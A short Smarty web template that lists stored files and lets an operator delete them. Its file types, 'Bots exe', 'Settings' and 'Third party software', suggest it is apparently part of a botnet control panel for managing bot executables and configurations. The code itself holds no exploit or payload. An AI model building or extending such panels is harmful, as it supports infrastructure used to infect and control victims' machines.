{include file='upload_file.tpl'}
<hr color="#dddddd" size="1"><br>
{if isset($CONTARR)}
<h2><b>Existing files</b></h2>
	<table style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 240);" border="1" cellpadding="3" cellspacing="0">
	<tr><th>ID</th><th>Name</th><th>Hash</th><th>Size (KB)</th><th>Type</th><th> </th></tr>
	{foreach from=$CONTARR item=REC}
	<tr id='t{$REC.ID}' align='center'><td>{$REC.ID}</td><td align='center'>{$REC.NAME}</td><td align='center'>{$REC.MD5}</td>
	<td align='center'>{$REC.SIZE}</td><td align='center'>
		<img src='img/{if $REC.TYPE=='b'}icos/botsexe_16px.png{elseif $REC.TYPE=='c'}icos/settings_16px.png{else}icos/thirdpartysoftware_16px.png{/if}' title='{if $REC.TYPE=='b'}Bots exe{elseif $REC.TYPE=='c'}Settings{else}Third party software{/if}'>	
	</td>
	<td><a href='javascript:void();' onclick="if (!confirm('Do you really want to delete this file?')) return false; DeleteFile({$REC.ID}); return false;"><img src='img/icos/delete.png' style='border:0px;'></a></td></tr>
	{/foreach}
	</table>
{else}
	<font class='error'>There are no files</font>
{/if}
	<div id='del_file'></div>
	
{literal}
<script>
function DeleteFile(id)
{
	var el = document.getElementById('t' + id);
	if (el) el.innerHTML = '';
	load2('./mod/file_del.php?id=' + id, 'del_file');
}
</script>
{/literal}